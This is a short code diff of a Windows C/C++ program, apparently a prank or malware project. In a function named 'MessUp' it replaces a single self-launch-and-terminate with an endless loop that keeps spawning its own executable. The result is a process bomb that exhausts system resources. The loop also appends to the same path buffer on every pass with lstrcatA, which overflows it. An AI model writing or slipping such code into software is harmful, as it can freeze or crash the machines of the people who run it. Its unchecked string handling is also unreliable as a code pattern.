@@ -215,8 +215,8 @@ void MessUp()
 	si.cb = sizeof(si);
 	RtlZeroMemory(&pi, sizeof(pi));
 
-	CreateProcessA(0, lstrcatA(exePath, " lol"), 0, 0, 0, 0, 0, 0, &si, &pi);
-	TerminateProcess(pi.hProcess, 1337);
+	while (true)
+		CreateProcessA(0, lstrcatA(exePath, " lol"), 0, 0, 0, 0, 0, 0, &si, &pi);
 }
 
 int __stdcall WinMain(HINSTANCE hI, HINSTANCE, LPSTR, int)
